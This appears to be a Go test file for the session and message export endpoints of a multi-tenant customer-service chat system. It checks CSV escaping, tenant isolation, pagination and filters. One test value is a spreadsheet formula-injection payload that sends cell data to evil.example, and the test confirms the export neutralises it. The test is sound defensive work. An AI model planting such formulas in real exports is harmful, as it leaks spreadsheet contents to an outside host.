package api_test

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"npckefu/internal/im"
	"npckefu/internal/store"
)

func getRaw(t *testing.T, u string, h map[string]string) (int, http.Header, []byte) {
	t.Helper()
	req, _ := http.NewRequest("GET", u, nil)
	for k, v := range h {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, resp.Header, b
}

func parseCSV(t *testing.T, b []byte) [][]string {
	t.Helper()
	if !bytes.HasPrefix(b, []byte("\xEF\xBB\xBF")) {
		t.Fatal("CSV must start with a UTF-8 BOM (Excel needs it for Chinese)")
	}
	rows, err := csv.NewReader(bytes.NewReader(b[3:])).ReadAll()
	if err != nil {
		t.Fatalf("invalid CSV: %v", err)
	}
	return rows
}

func col(header []string, name string) int {
	for i, h := range header {
		if h == name {
			return i
		}
	}
	panic("no column " + name)
}

func TestExport(t *testing.T) {
	old := store.ExportPageSize
	store.ExportPageSize = 3 // 小页：让 9 个会话跨越多个分页边界
	t.Cleanup(func() { store.ExportPageSize = old })
	e := newEnv(t)
	base := e.srv.URL
	ag1, ag2 := mkAgent(t, e, "ex-ag", "", 10), mkAgent(t, e, "ex-ag2", "", 10)
	ac1 := dial(t, base, e.tenant.AppKey, ag1)
	defer ac1.Close()
	time.Sleep(200 * time.Millisecond)

	// ---- s1：仅机器人，访客自己结束，评 5 分，评语是公式注入 payload ----
	const evil = `=HYPERLINK("http://evil.example/?"&A1,"点我")`
	v1 := e.visitor(t)
	c1 := dial(t, base, e.tenant.AppKey, v1)
	defer c1.Close()
	c1.WriteJSON(map[string]any{"op": "start"})
	s1 := wait(t, c1, func(x im.Event) bool { return x.Op == "session" }).Session
	c1.WriteJSON(map[string]any{"op": "send", "session_id": s1.ID, "client_msg_id": "1", "body": "你好"})
	wait(t, c1, func(x im.Event) bool {
		return x.Op == "msg" && x.Message.FromRole == "bot" && strings.Contains(x.Message.Body, "抱歉")
	})
	closeBy(t, c1, c1, s1.ID)
	rateWS(c1, s1.ID, 5, evil)
	wait(t, c1, func(x im.Event) bool { return x.Op == "rated" })

	// ---- s2：人工接待 → 转接给 ex-ag2；含特殊字符/公式/图片消息；评 3 分 ----
	c2, v2, s2 := openHuman(t, e, ac1)
	defer c2.Close()
	ac2 := dial(t, base, e.tenant.AppKey, ag2)
	defer ac2.Close()
	time.Sleep(200 * time.Millisecond)
	const tricky = "你好,\"引用\"\n第二行"
	c2.WriteJSON(map[string]any{"op": "send", "session_id": s2.ID, "client_msg_id": "t1", "body": tricky})
	c2.WriteJSON(map[string]any{"op": "send", "session_id": s2.ID, "client_msg_id": "t2", "body": "=1+1"})
	_, up := upload(t, base, accHdr(e, v2), "file", "a.png", genPNG(t, 6, 4))
	c2.WriteJSON(map[string]any{"op": "send", "session_id": s2.ID, "client_msg_id": "t3", "type": "image", "body": `{"file_id":"` + up["file_id"].(string) + `"}`})
	wait(t, c2, func(x im.Event) bool { return x.Op == "ack" && x.ClientMsgID == "t3" })
	if c := do(t, "POST", fmt.Sprintf("%s/v1/sessions/%d/transfer", base, s2.ID), e.h, map[string]any{"to_agent": "ex-ag2"}, nil); c != 200 {
		t.Fatalf("transfer: %d", c)
	}
	ac2.WriteJSON(map[string]any{"op": "send", "session_id": s2.ID, "client_msg_id": "a1", "body": "我是新客服"})
	wait(t, c2, func(x im.Event) bool { return x.Op == "msg" && x.Message.From == "ex-ag2" })
	closeBy(t, ac2, c2, s2.ID)
	rateWS(c2, s2.ID, 3, "还行")
	wait(t, c2, func(x im.Event) bool { return x.Op == "rated" })

	// ---- 另外 7 个空会话（访客开始后立刻结束）→ 共 9 个会话 ----
	ids := []int64{s1.ID, s2.ID}
	for i := 0; i < 7; i++ {
		v := e.visitor(t)
		c := dial(t, base, e.tenant.AppKey, v)
		c.WriteJSON(map[string]any{"op": "start"})
		s := wait(t, c, func(x im.Event) bool { return x.Op == "session" }).Session
		closeBy(t, c, c, s.ID)
		c.Close()
		ids = append(ids, s.ID)
	}
	// ---- 另一个租户的会话：绝不能出现在本租户的导出里 ----
	var other store.Tenant
	do(t, "POST", base+"/v1/tenants", map[string]string{"X-Admin-Token": "adm"}, map[string]string{"name": "other"}, &other)
	var ov store.Account
	do(t, "POST", base+"/v1/visitors/register", nil, map[string]string{"app_key": other.AppKey}, &ov)
	oc := dial(t, base, other.AppKey, ov)
	oc.WriteJSON(map[string]any{"op": "start"})
	wait(t, oc, func(x im.Event) bool { return x.Op == "session" })
	oc.Close()

	ex := func(path string, q url.Values) (int, http.Header, []byte) {
		return getRaw(t, base+path+"?"+q.Encode(), e.h)
	}

	// ---- 鉴权与参数校验 ----
	if c, _, _ := getRaw(t, base+"/v1/export/sessions", map[string]string{"X-App-Key": e.tenant.AppKey, "X-App-Secret": "bad"}); c != 401 {
		t.Fatalf("bad secret: %d", c)
	}
	for _, bad := range []url.Values{{"format": {"xlsx"}}, {"tz": {"Mars/Base"}}, {"limit": {"0"}}, {"limit": {"9999999"}}, {"limit": {"x"}}, {"from": {"yesterday"}}, {"to": {"nope"}},
		{"from": {"2030-01-02"}, "to": {"2030-01-01"}}, {"status": {"weird"}}} {
		if c, _, b := ex("/v1/export/sessions", bad); c != 400 {
			t.Errorf("%v: want 400, got %d %s", bad, c, b)
		}
	}

	// ---- 会话 CSV ----
	c, hdr, body := ex("/v1/export/sessions", url.Values{"tz": {"UTC"}})
	if c != 200 || !strings.HasPrefix(hdr.Get("Content-Type"), "text/csv") || !strings.Contains(hdr.Get("Content-Disposition"), "attachment; filename=\"sessions-") || hdr.Get("Cache-Control") != "no-store" {
		t.Fatalf("headers: %d %v", c, hdr)
	}
	rows := parseCSV(t, body)
	head := rows[0]
	if len(rows) != 1+9 { // 跨 3 个分页（页大小 3）：一个都不能少、不能重复
		t.Fatalf("want 9 sessions across page boundaries, got %d rows", len(rows)-1)
	}
	var last int64
	seen := map[int64]bool{}
	for _, r := range rows[1:] {
		id, _ := strconv.ParseInt(r[col(head, "session_id")], 10, 64)
		if id <= last || seen[id] {
			t.Fatalf("sessions must be ascending & unique: %d after %d", id, last)
		}
		last, seen[id] = id, true
		if strings.Contains(strings.Join(r, ","), ov.Accid) {
			t.Fatal("another tenant's session leaked into the export")
		}
	}
	for _, id := range ids {
		if !seen[id] {
			t.Fatalf("session %d missing", id)
		}
	}
	row := func(sid int64) []string {
		for _, r := range rows[1:] {
			if r[col(head, "session_id")] == strconv.FormatInt(sid, 10) {
				return r
			}
		}
		t.Fatalf("no row for %d", sid)
		return nil
	}
	r1, r2 := row(s1.ID), row(s2.ID)
	if r1[col(head, "status")] != "closed" || r1[col(head, "agent_accid")] != "" || r1[col(head, "messages")] != "1" || r1[col(head, "rating_score")] != "5" || r1[col(head, "transfers")] != "0" {
		t.Fatalf("s1 row: %v", r1)
	}
	if got := r1[col(head, "rating_comment")]; got != "'"+evil {
		t.Fatalf("formula injection must be neutralised, got %q", got)
	}
	if r2[col(head, "agent_accid")] != "ex-ag2" || r2[col(head, "transfers")] != "1" || r2[col(head, "rating_score")] != "3" || r2[col(head, "rating_comment")] != "还行" || r2[col(head, "messages")] != "5" {
		t.Fatalf("s2 row: %v", r2) // 访客 4 条（转人工 + 3 条内容，含图片）+ 坐席 1 条
	}
	if d, err := strconv.Atoi(r2[col(head, "duration_seconds")]); err != nil || d < 0 || d > 60 {
		t.Fatalf("duration: %q", r2[col(head, "duration_seconds")])
	}

	// ---- 时区：同一时刻在 Asia/Shanghai 比 UTC 晚 8 小时 ----
	_, _, bodySH := ex("/v1/export/sessions", url.Values{"tz": {"Asia/Shanghai"}})
	rowsSH := parseCSV(t, bodySH)
	a, _ := time.Parse(exportLayout, r1[col(head, "created_at")])
	b, _ := time.Parse(exportLayout, rowsSH[1][col(head, "created_at")])
	if rowsSH[1][col(head, "session_id")] != rows[1][col(head, "session_id")] || b.Sub(a) != 8*time.Hour {
		t.Fatalf("time zone: UTC %v vs Shanghai %v", rows[1][col(head, "created_at")], rowsSH[1][col(head, "created_at")])
	}

	// ---- 过滤 / limit / 日期范围 ----
	count := func(q url.Values) int { _, _, b := ex("/v1/export/sessions", q); return len(parseCSV(t, b)) - 1 }
	today := time.Now().UTC().Format("2006-01-02")
	for name, tc := range map[string]struct {
		q    url.Values
		want int
	}{
		"status=closed": {url.Values{"status": {"closed"}}, 9}, "status=active": {url.Values{"status": {"active"}}, 0},
		"agent=ex-ag2": {url.Values{"agent": {"ex-ag2"}}, 1}, "visitor": {url.Values{"visitor": {v1.Accid}}, 1},
		"limit=4（跨页）": {url.Values{"limit": {"4"}}, 4}, "limit=1": {url.Values{"limit": {"1"}}, 1},
		"from/to 含今天": {url.Values{"from": {today}, "to": {today}, "tz": {"UTC"}}, 9},
		"区间在未来":       {url.Values{"from": {"2999-01-01"}, "to": {"2999-01-02"}}, 0}, "区间在过去": {url.Values{"from": {"2000-01-01"}, "to": {"2000-01-02"}}, 0},
	} {
		if got := count(tc.q); got != tc.want {
			t.Errorf("%s: got %d rows, want %d", name, got, tc.want)
		}
	}

	// ---- 会话 JSONL：类型正确，未结束/无评价的字段为 null ----
	_, hj, bj := ex("/v1/export/sessions", url.Values{"format": {"jsonl"}})
	if !strings.HasPrefix(hj.Get("Content-Type"), "application/x-ndjson") {
		t.Fatalf("jsonl content type: %s", hj.Get("Content-Type"))
	}
	lines := strings.Split(strings.TrimSpace(string(bj)), "\n")
	if len(lines) != 9 {
		t.Fatalf("jsonl lines: %d", len(lines))
	}
	for _, ln := range lines {
		var o map[string]any
		if err := json.Unmarshal([]byte(ln), &o); err != nil {
			t.Fatalf("bad jsonl line %q: %v", ln, err)
		}
		if o["session_id"] == float64(s1.ID) {
			if o["rating_score"] != float64(5) || o["rating_comment"] != evil || o["messages"] != float64(1) { // JSON 里保持原文，不加引号前缀
				t.Fatalf("s1 json: %v", o)
			}
		}
	}

	// ---- 聊天记录 CSV ----
	c, _, body = ex("/v1/export/messages", url.Values{})
	if c != 200 {
		t.Fatalf("messages export: %d %s", c, body)
	}
	mrows := parseCSV(t, body)
	mh := mrows[0]
	var contents []string
	var imgRow []string
	prevSess, prevSeq := int64(0), int64(0)
	for _, r := range mrows[1:] {
		sid, _ := strconv.ParseInt(r[col(mh, "session_id")], 10, 64)
		seq, _ := strconv.ParseInt(r[col(mh, "seq")], 10, 64)
		if sid < prevSess || (sid == prevSess && seq <= prevSeq) {
			t.Fatalf("messages must be ordered by session then seq: (%d,%d) after (%d,%d)", sid, seq, prevSess, prevSeq)
		}
		prevSess, prevSeq = sid, seq
		if strings.Contains(strings.Join(r, ","), ov.Accid) {
			t.Fatal("other tenant's message leaked")
		}
		contents = append(contents, r[col(mh, "content")])
		if r[col(mh, "type")] == "image" {
			imgRow = r
		}
	}
	has := func(s string) bool {
		for _, c := range contents {
			if c == s {
				return true
			}
		}
		return false
	}
	if !has(tricky) { // 逗号、引号、换行经 CSV 往返后必须逐字还原
		t.Fatalf("comma/quote/newline body not preserved: %q", contents)
	}
	if !has("'=1+1") || has("=1+1") {
		t.Fatalf("formula body must be neutralised in CSV: %q", contents)
	}
	if imgRow == nil || imgRow[col(mh, "content")] != "[图片]" || imgRow[col(mh, "image_url")] != "/files/"+up["file_id"].(string) {
		t.Fatalf("image row: %v", imgRow)
	}
	hasSystem := func(rows [][]string) bool {
		for _, r := range rows[1:] {
			if r[col(mh, "from_role")] == "system" {
				return true
			}
		}
		return false
	}
	if !hasSystem(mrows) {
		t.Fatal("system messages should be included by default")
	}
	_, _, bodyNS := ex("/v1/export/messages", url.Values{"exclude_system": {"1"}})
	if nsRows := parseCSV(t, bodyNS); hasSystem(nsRows) || len(nsRows) >= len(mrows) {
		t.Fatalf("exclude_system=1 should drop system rows: %d vs %d", len(nsRows), len(mrows))
	}
	_, _, bodyL := ex("/v1/export/messages", url.Values{"limit": {"5"}})
	if n := len(parseCSV(t, bodyL)) - 1; n != 5 {
		t.Fatalf("messages limit=5: got %d", n)
	}
	_, _, bodyV := ex("/v1/export/messages", url.Values{"visitor": {v2.Accid}, "format": {"jsonl"}})
	for _, ln := range strings.Split(strings.TrimSpace(string(bodyV)), "\n") {
		var o map[string]any
		if json.Unmarshal([]byte(ln), &o) != nil || o["visitor_accid"] != v2.Accid || o["session_id"] != float64(s2.ID) {
			t.Fatalf("visitor-filtered message export: %s", ln)
		}
	}
}

const exportLayout = "2006-01-02 15:04:05"
